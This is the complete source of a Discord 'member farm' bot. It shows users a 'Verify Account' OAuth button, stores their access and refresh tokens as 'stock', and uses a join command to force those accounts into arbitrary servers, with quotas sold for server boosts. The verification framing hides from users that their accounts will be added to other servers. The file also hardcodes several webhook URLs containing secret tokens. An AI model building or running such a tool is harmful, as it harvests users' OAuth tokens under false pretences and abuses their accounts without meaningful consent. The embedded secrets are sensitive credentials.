const { 
    Client, 
    GatewayIntentBits, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionsBitField,
    REST,
    Routes,
    SlashCommandBuilder,
    WebhookClient,
    MessageType
} = require('discord.js');
const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

const DEFAULT_PREFIX = ','; 
let currentPrefix = DEFAULT_PREFIX;
const OWNER_ID = '1481977461053984845';
const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone

// --- Dedicated Webhook Clients ---
const WEBHOOKS = {
    RESTOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062223049789462/5Mf4bAK5hH33ArZ2PNTZF7GB2ccp4ZClErmt5KIv1v5VROS3tmiVZRR5pnbcyutAyIVc' }),
    LIVE_STOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062337184923821/P3j22VibL9VSasIPfR2EEFu9n4_AIaIa65je-2joyPMAge-ZEOZXDAgwRRGoHhE1RlzM' }),
    ADD_BOT: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062454743007316/MhzdNOi6VDiVthZh9-p4YwUdWMTRrC926xohzUu3mvw1yOXkwtH9BQFshApFcrOcsIL4' }),
    VERIFICATION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565060498955698436/Y3TO5kufTLMNpJVt5wXCxV-nxXP0eH4qz7kxkS299viAANZLKwiTjYVyPZAdnUPSSW9g' }),
    AUTH: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565082617387286659/moMXyDZt7yk02ZEcWlpRPBpNiZkV2rOOFyjSA21jv7cIRwj4KzjCO20gIMYTDsO3D3vm' }),
    BOOST_STICK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062620732465294/5mZAWSI6o05Q_EHdWX67qE2ws5qIKvsXgTqWC8h1khpFmKHtqNTxWt7Ann2nqklA7y3Q' }),
    USE_R_BOT: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062878569041920/BklXjuG2g9QoqEwgtcTchZvpYqMOzFhl5Wnjp8fb3c1IZZedoAOwuqW0C6b_9yyYXB51' }),
    STATUS: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565063716674863245/hGnnYlGvnmiH08d0PfTqhW_7t97XDI1PaVqXMb-9_2qI3CGeZA6NgNPXncfNwUEG5BmD' }),
    EXECUTION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565043524284457015/ln5xswheqPX20TbuQ_YG4V52h0T8CtvJM5gah_QgmPDsnr0bxWCr9XJl19BmkMiPl7NZ' })
};

// Fixed Automatic Verification OAuth URL
const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=identify+guilds.join';
const RBOT_SERVER_INVITE = 'https://discord.gg/ZK3Er7Xgdq';

// --- Built-in File Persistence Setup ---
const DB_FILE = path.join(__dirname, 'database.json');

function readDB() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockMessageId: null }, null, 2));
        }
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        return { users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockMessageId: null };
    }
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// --- Built-in HTTPS Request Helper ---
function postHttps(url, bodyString, headers = {}) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const req = https.request({
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'POST',
            headers: {
                ...headers,
                'Content-Length': Buffer.byteLength(bodyString)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
                catch (e) { resolve({ status: res.statusCode, data }); }
            });
        });
        req.on('error', reject);
        req.write(bodyString);
        req.end();
    });
}

function getHttps(url, headers = {}) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const req = https.request({
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'GET',
            headers
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
                catch (e) { resolve({ status: res.statusCode, data }); }
            });
        });
        req.on('error', reject);
        req.end();
    });
}

const CHANNELS = {
    AUTORESTOCK: '1563253480553054358',       
    LIVE_STOCK_PANEL: '1563253481853427745',
    FARM_LOG: '1563253450693808210',          
    VERIFICATION_LOG: '1563253454653235261',  
    AUTO_DELETE: '1563253483824746659',
    ADD_BOT: '1563253479059886223'        
};

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ]
});

// --- Register Slash Commands ---
const slashCommands = [
    new SlashCommandBuilder()
        .setName('verify')
        .setDescription('Create a verified panel with interactive button')
        .addStringOption(option => option.setName('description').setDescription('Main embed description text').setRequired(true))
        .addStringOption(option => option.setName('title').setDescription('Optional embed title').setRequired(false))
        .addStringOption(option => option.setName('webhook_url').setDescription('Optional custom Webhook URL').setRequired(false)),
    new SlashCommandBuilder()
        .setName('say')
        .setDescription('Send custom message or embed')
        .addStringOption(option => option.setName('message').setDescription('Content to send').setRequired(true))
        .addBooleanOption(option => option.setName('embed').setDescription('Send as embed format').setRequired(false))
        .addStringOption(option => option.setName('webhook_url').setDescription('Optional Webhook URL').setRequired(false))
].map(command => command.toJSON());

// --- Modern Centered Web Server Routes for OAuth Callbacks ---
app.get('/', async (req, res) => {
    const code = req.query.code;
    const error = req.query.error;

    if (error) {
        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Authorization Cancelled</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">You declined the authorization request. You can safely close this window and return to Discord.</p>
                    </div>
                </body>
            </html>
        `);
    }
    
    if (!code) {
        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#f5f5f7;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Flex Farmer Authentication</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">OAuth authentication server is operating normally.</p>
                    </div>
                </body>
            </html>
        `);
    }

    try {
        const verificationClientId = process.env.VERIFICATION_CLIENT_ID || process.env.CLIENT_ID || '1564997108908556369';
        const verificationClientSecret = process.env.VERIFICATION_CLIENT_SECRET || process.env.CLIENT_SECRET;
        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';

        const tokenParams = new URLSearchParams({
            client_id: verificationClientId,
            client_secret: verificationClientSecret,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri,
        }).toString();

        const tokenRes = await postHttps('https://discord.com/api/oauth2/token', tokenParams, {
            'Content-Type': 'application/x-www-form-urlencoded'
        });

        if (tokenRes.status !== 200 || !tokenRes.data || !tokenRes.data.access_token) {
            console.error('[OAUTH TOKEN ERROR DETAILS] Status:', tokenRes.status, 'Data:', JSON.stringify(tokenRes.data));
            return res.send(`
                <html>
                    <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                        <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                            <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Failed</h2>
                            <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Token exchange was rejected by Discord. Please check your Railway environment variables.</p>
                        </div>
                    </body>
                </html>
            `);
        }

        const oauthData = tokenRes.data;
        const userRes = await getHttps('https://discord.com/api/users/@me', {
            'Authorization': `Bearer ${oauthData.access_token}`
        });
        const userData = userRes.data;

        if (!userData || !userData.id) {
            return res.send(`
                <html>
                    <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                        <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                            <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Failed</h2>
                            <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Failed to retrieve your Discord user profile.</p>
                        </div>
                    </body>
                </html>
            `);
        }

        let dbData = readDB();
        dbData.users[userData.id] = {
            user_id: userData.id,
            username: userData.username,
            avatar: userData.avatar,
            banner: userData.banner,
            access_token: oauthData.access_token,
            refresh_token: oauthData.refresh_token,
            authorized_at: Date.now(),
            expires_at: Date.now() + (oauthData.expires_in * 1000)
        };
        dbData.restockCounter = (dbData.restockCounter || 0) + 1;
        dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + 1;
        writeDB(dbData);

        const totalStock = Object.keys(dbData.users).length;

        if (client.isReady()) {
            try {
                let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
                if (verifLogChannel) {
                    const logEmbed = new EmbedBuilder()
                        .setTitle('New User Verified')
                        .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully.\n\nTotal Available Stock: \`${totalStock}\``)
                        .setColor(EMBED_COLOR)
                        .setTimestamp();

                    await verifLogChannel.send({ embeds: [logEmbed] });
                }
            } catch (logErr) {
                console.error('[VERIFICATION LOG ERROR]', logErr);
            }
        }

        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#55ff55;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Successful</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Your account has been verified successfully. You can now close this window and return to Discord.</p>
                    </div>
                </body>
            </html>
        `);
    } catch (error) {
        console.error('[OAUTH EXCEPTION]', error);
        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Server Error</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">An exception occurred during verification processing.</p>
                    </div>
                </body>
            </html>
        `);
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on port ${PORT}`));

// --- Live Persistent Stock Message Editor (Channel 1563253481853427745) ---
async function updateLiveStockPanel() {
    try {
        const stockChannel = client.channels.cache.get(CHANNELS.LIVE_STOCK_PANEL) || await client.channels.fetch(CHANNELS.LIVE_STOCK_PANEL);
        if (!stockChannel) return;

        const dbData = readDB();
        const totalStock = Object.keys(dbData.users).length;

        const stockEmbed = new EmbedBuilder()
            .setTitle('Flex Network | Live Stock Status')
            .setDescription(`Current Active Stock: **\`${totalStock}\`** accounts available.\n\n*Updated automatically every 30 seconds.*`)
            .setColor(EMBED_COLOR)
            .setTimestamp();

        if (dbData.liveStockMessageId) {
            try {
                const existingMsg = await stockChannel.messages.fetch(dbData.liveStockMessageId);
                if (existingMsg) {
                    await existingMsg.edit({ embeds: [stockEmbed] });
                    return;
                }
            } catch (e) {
                // Message no longer exists, will create a new one below
            }
        }

        const newMsg = await stockChannel.send({ embeds: [stockEmbed] });
        dbData.liveStockMessageId = newMsg.id;
        writeDB(dbData);
    } catch (err) {
        console.error('Failed to update live stock panel:', err);
    }
}

client.once('ready', async () => {
    console.log(`Flex Farmer logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: slashCommands }
        );
        console.log('Successfully registered /verify and /say slash commands.');
    } catch (slashErr) {
        console.error('Failed to register slash commands:', slashErr);
    }

    await updateLiveStockPanel();
    setInterval(updateLiveStockPanel, 30000);
});

// --- Button Interaction Handler & Slash Commands ---
client.on('interactionCreate', async interaction => {
    if (interaction.isButton()) {
        if (interaction.customId.startsWith('restock_yes_')) {
            const amountAdded = interaction.customId.split('_')[2];
            await interaction.update({ content: 'Restock announcement confirmed. Sending to restock channel...', components: [] });
            try {
                const restockAnnouncement = 
                    `### RESTOCK!\n\n` +
                    `The bot has been **restocked** with **${amountAdded}** fresh new accounts.\n\n` +
                    `Make sure to check out our <#1563253471145361572> and <#1563253474899005460>\n\n` +
                    `Farm here -> <#1563253483824746659>\n` +
                    `Add bot here -> <#1563253479059886223>\n\n` +
                    `> React with ☑️ for more restocks like this!\n\n` +
                    `-# @everyone`;

                const sentMsg = await WEBHOOKS.RESTOCK.send({ content: restockAnnouncement, wait: true });
                await sentMsg.react('☑️');
            } catch (err) {
                console.error('Failed to send restock announcement via webhook:', err);
            }
            return;
        } else if (interaction.customId === 'restock_no') {
            return interaction.update({ content: 'Restock announcement cancelled.', components: [] });
        }
    }

    if (!interaction.isChatInputCommand()) return;

    if (interaction.user.id !== OWNER_ID) {
        return interaction.reply({ content: 'Only the bot owner can use slash commands.', ephemeral: true });
    }

    if (interaction.commandName === 'verify') {
        const descriptionText = interaction.options.getString('description');
        const titleText = interaction.options.getString('title');
        const webhookUrl = interaction.options.getString('webhook_url');

        const embed = new EmbedBuilder()
            .setDescription(descriptionText)
            .setColor(EMBED_COLOR);

        if (titleText) {
            embed.setTitle(titleText);
        }

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Verify Account')
                .setStyle(ButtonStyle.Link)
                .setURL(AUTOMATIC_VERIFY_OAUTH_URL)
        );

        try {
            if (webhookUrl) {
                const customWebhook = new WebhookClient({ url: webhookUrl });
                await customWebhook.send({ embeds: [embed], components: [row] });
                return interaction.reply({ content: 'Verification embed sent via target webhook.', ephemeral: true });
            }

            // Sends natively via bot client channel so the button renders reliably
            await interaction.channel.send({ embeds: [embed], components: [row] });
            return interaction.reply({ content: 'Verification panel with link button created successfully!', ephemeral: true });
        } catch (err) {
            return interaction.reply({ content: `Failed to create verification panel: ${err.message}`, ephemeral: true });
        }
    }

    if (interaction.commandName === 'say') {
        const textMessage = interaction.options.getString('message');
        const isEmbed = interaction.options.getBoolean('embed') || false;
        const webhookUrl = interaction.options.getString('webhook_url');

        try {
            if (webhookUrl) {
                const whClient = new WebhookClient({ url: webhookUrl });
                if (isEmbed) {
                    await whClient.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(EMBED_COLOR)] });
                } else {
                    await whClient.send({ content: textMessage });
                }
                return interaction.reply({ content: 'Sent via Webhook.', ephemeral: true });
            }

            if (isEmbed) {
                await WEBHOOKS.STATUS.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(EMBED_COLOR)] });
            } else {
                await WEBHOOKS.STATUS.send({ content: textMessage });
            }
            return interaction.reply({ content: 'Sent via Status webhook.', ephemeral: true });
        } catch (err) {
            return interaction.reply({ content: `Failed: ${err.message}`, ephemeral: true });
        }
    }
});

// --- 2-Hour Inactivity Kick Tracking & Auto-Delete Channel Handler ---
const pendingJoins = new Map();

client.on('guildMemberAdd', member => {
    if (member.user.bot) return;
    const timer = setTimeout(async () => {
        try {
            if (member.kickable) {
                await member.kick('Inactive: Did not use join command within 2 hours.');
                console.log(`[AUTO-KICK] Kicked ${member.user.tag} for inactivity.`);
            }
        } catch (e) {
            console.error('Failed to auto-kick inactive member:', e);
        }
        pendingJoins.delete(member.id);
    }, 2 * 60 * 60 * 1000);

    pendingJoins.set(member.id, timer);
});

client.on('messageCreate', async message => {
    const rawContent = message.content ? message.content.trim() : '';
    if (message.author.bot) return;

    const isBoostMessage = [
        MessageType.GuildBoost,
        MessageType.GuildBoostTier1,
        MessageType.GuildBoostTier2,
        MessageType.GuildBoostTier3
    ].includes(message.type);

    if (isBoostMessage) {
        const boostContent = 
            `**FLEX | BOOST REWARDS**\n\n` +
            `Boost the server to earn higher rank tier limits.\n\n` +
            `2 Boosts = <@&1563467675236311100>\n\n` +
            `4 Boosts = <@&1563467259194908722>\n\n\n` +
            `Ranks are active for 2-3 weeks.\n` +
            `Ranks are not automatically assigned.\n` +
            `Open a ticket in <#1563253473238065326> to claim your rank.`;
        await WEBHOOKS.BOOST_STICK.send({ embeds: [new EmbedBuilder().setDescription(boostContent).setColor(EMBED_COLOR)] });
        return;
    }

    // Auto-Delete Channel Logic (1563253483824746659)
    if (message.channel.id === CHANNELS.AUTO_DELETE) {
        setTimeout(async () => {
            try { if (message.deletable) await message.delete(); } catch (err) {}
        }, 7000);
    }

    if (rawContent.toLowerCase() === ',rbot' || rawContent.toLowerCase() === '.rbot') {
        const rbotEmbed = new EmbedBuilder().setDescription('Use the bot via the button below.').setColor(EMBED_COLOR);
        const rbotButton = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Use Bot').setStyle(ButtonStyle.Link).setURL(RBOT_SERVER_INVITE)
        );
        await WEBHOOKS.USE_R_BOT.send({ embeds: [rbotEmbed], components: [rbotButton] });
        try { if (message.deletable) await message.delete(); } catch(e){}
        return;
    }

    if (!rawContent.startsWith(currentPrefix)) return;

    const args = rawContent.slice(currentPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (message.author.id !== OWNER_ID && command !== 'join') {
        return message.channel.send('Only the join command is available to regular members.');
    }

    if (command === 'help') {
        if (message.author.id !== OWNER_ID) return;
        const helpEmbed = new EmbedBuilder()
            .setTitle('Member Farm - Command Panel')
            .setDescription(`Current prefix: \`${currentPrefix}\` — Slash commands: \`/verify\`, \`/say\``)
            .setColor(EMBED_COLOR)
            .addFields(
                { 
                    name: 'Core & Verification', 
                    value: `\`/verify\` - Slash command to generate verification embed with button\n\`/say\` - Slash command to send messages/embeds\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
                },
                { 
                    name: 'Config & Management', 
                    value: `\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
                }
            )
            .setFooter({ text: 'Member Farm Utility' });

        return WEBHOOKS.STATUS.send({ embeds: [helpEmbed] });
    }

    if (command === 'bot' || command === 'invite') {
        if (message.author.id !== OWNER_ID) return;
        const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1564997108908556369&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app%2F&integration_type=0&scope=bot+guilds';
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(inviteUrl));
        return WEBHOOKS.ADD_BOT.send({ components: [row] });
    }

    if (command === 'stock') {
        if (message.author.id !== OWNER_ID) return;
        const dbData = readDB();
        const users = Object.values(dbData.users);
        const lastRestockCount = Math.min(dbData.restockCounter || 0, users.length);
        const stockEmbed = new EmbedBuilder().setTitle('Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(EMBED_COLOR);
        return WEBHOOKS.AUTH.send({ embeds: [stockEmbed] });
    }

    if (command === 'auth' || command === 'authed') {
        if (message.author.id !== OWNER_ID) return;
        const dbData = readDB();
        const users = Object.values(dbData.users);
        const now = Date.now();
        const last24hCount = users.filter(user => user.authorized_at && user.authorized_at >= (now - 86400000)).length;

        const authEmbed = new EmbedBuilder()
            .setTitle('Authorization & Stock Statistics')
            .setColor(EMBED_COLOR)
            .addFields(
                { name: 'Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
                { name: 'All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
                { name: 'Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
            );
        return WEBHOOKS.AUTH.send({ embeds: [authEmbed] });
    }

    if (command === 'status') {
        if (message.author.id !== OWNER_ID) return;
        const dbData = readDB();
        const users = Object.values(dbData.users);
        const uptimeSeconds = Math.floor(client.uptime / 1000);
        const hours = Math.floor(uptimeSeconds / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        const seconds = uptimeSeconds % 60;
        const statusEmbed = new EmbedBuilder()
            .setTitle('Flex Farmer Status')
            .setColor(EMBED_COLOR)
            .addFields(
                { name: 'Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
                { name: 'Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
            );
        return WEBHOOKS.STATUS.send({ embeds: [statusEmbed] });
    }

    if (command === 'restock') {
        if (message.author.id !== OWNER_ID) return;
        const dbData = readDB();
        const users = Object.values(dbData.users);
        const amount = parseInt(args[0]) || users.length;
        dbData.restockCounter = amount;
        dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + amount;
        writeDB(dbData);
        await updateLiveStockPanel();

        const promptEmbed = new EmbedBuilder()
            .setTitle('Restock Stock Prepared')
            .setDescription(`Successfully stocked **${amount}** authorized users.\n\n**Would you like to send the restock announcement in <#${CHANNELS.AUTORESTOCK}>?**`)
            .setColor(EMBED_COLOR);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`restock_yes_${amount}`).setLabel('Yes').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('restock_no').setLabel('No').setStyle(ButtonStyle.Danger)
        );

        return WEBHOOKS.RESTOCK.send({ embeds: [promptEmbed], components: [row] });
    }

    if (command === 'remove') {
        if (message.author.id !== OWNER_ID) return;
        const amount = parseInt(args[0]) || 1;
        let dbData = readDB();
        let userKeys = Object.keys(dbData.users);
        for (let i = 0; i < Math.min(amount, userKeys.length); i++) {
            delete dbData.users[userKeys[i]];
        }
        writeDB(dbData);
        await updateLiveStockPanel();
        const remainingStock = Object.keys(dbData.users).length;
        return message.channel.send(`Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
    }

    if (command === 'join') {
        const targetGuildId = args[0];
        if (!targetGuildId) {
            return WEBHOOKS.EXECUTION.send({ content: `Please provide a Server ID: \`${currentPrefix}join <server_id>\`` });
        }

        const dbData = readDB();
        let tokensToUse = Object.values(dbData.users);
        if (tokensToUse.length === 0) {
            const outOfStockEmbed = new EmbedBuilder().setTitle('Out of Stock').setDescription(`No accounts available.`).setColor(EMBED_COLOR);
            return WEBHOOKS.EXECUTION.send({ embeds: [outOfStockEmbed] });
        }

        // Updated role limits: 2, 4, 6, 8, 10, 12, 20
        const roleLimits = [
            { id: '1564676932195455047', limit: 2 },   
            { id: '1563467132107231253', limit: 4 },   
            { id: '1563467152202137681', limit: 6 },   
            { id: '1563467218212356118', limit: 8 },   
            { id: '1563467378040504431', limit: 10 },   
            { id: '1563467675236311100', limit: 12 },  
            { id: '1563467259194908722', limit: 20 }   
        ];

        let allowedLimit = Infinity;
        let userMaxQueue = 20; 
        for (const tier of roleLimits) {
            if (message.member.roles.cache.has(tier.id)) {
                allowedLimit = tier.limit;
                userMaxQueue = tier.limit;
                break;
            }
        }

        if (allowedLimit !== Infinity) {
            const limit = Math.min(allowedLimit, tokensToUse.length);
            tokensToUse = tokensToUse.slice(0, limit);
        }

        const verificationBotToken = process.env.VERIFICATION_BOT_TOKEN || process.env.DISCORD_TOKEN;

        try {
            const checkGuildRes = await getHttps(`https://discord.com/api/v10/users/@me/guilds`, {
                'Authorization': `Bot ${verificationBotToken}`
            });
            const guildsList = checkGuildRes.data;
            const isInServer = Array.isArray(guildsList) && guildsList.some(g => g.id === targetGuildId);

            if (!isInServer) {
                const errorEmbed = new EmbedBuilder()
                    .setTitle('Bot Error')
                    .setDescription(`The bot is not in this server yet. Please go to <#${CHANNELS.ADD_BOT}> and invite it to your server.\n\nOnce the bot has joined, try using the command again.`)
                    .setColor(EMBED_COLOR);
                
                return WEBHOOKS.EXECUTION.send({ embeds: [errorEmbed] });
            }
        } catch (e) {
            console.error('Failed to check guild membership:', e);
        }

        if (pendingJoins.has(message.author.id)) {
            clearTimeout(pendingJoins.get(message.author.id));
            pendingJoins.delete(message.author.id);
        }

        const addingEmbed = new EmbedBuilder()
            .setTitle('Adding Members')
            .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
            .setColor(EMBED_COLOR);
        
        await WEBHOOKS.EXECUTION.send({ embeds: [addingEmbed] });

        let successCount = 0;
        for (const tokenData of tokensToUse) {
            try {
                const joinRes = await postHttps(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, JSON.stringify({ access_token: tokenData.access_token }), {
                    'Authorization': `Bot ${verificationBotToken}`,
                    'Content-Type': 'application/json'
                });

                if (joinRes.status >= 200 && joinRes.status < 300) {
                    successCount++;
                }
            } catch (err) {
                console.error('Failed to add user via Verification bot:', err);
            }
        }

        try {
            let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
            if (farmLogChannel) {
                const farmEmbed = new EmbedBuilder()
                    .setTitle('Farm Execution Log')
                    .setDescription(`**Executed By:** <@${message.author.id}>\n**Adder Bot:** Verification\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
                    .setColor(EMBED_COLOR)
                    .setTimestamp();
                await farmLogChannel.send({ embeds: [farmEmbed] });
            }
        } catch (e) {}
    }
});

client.login(process.env.DISCORD_TOKEN);
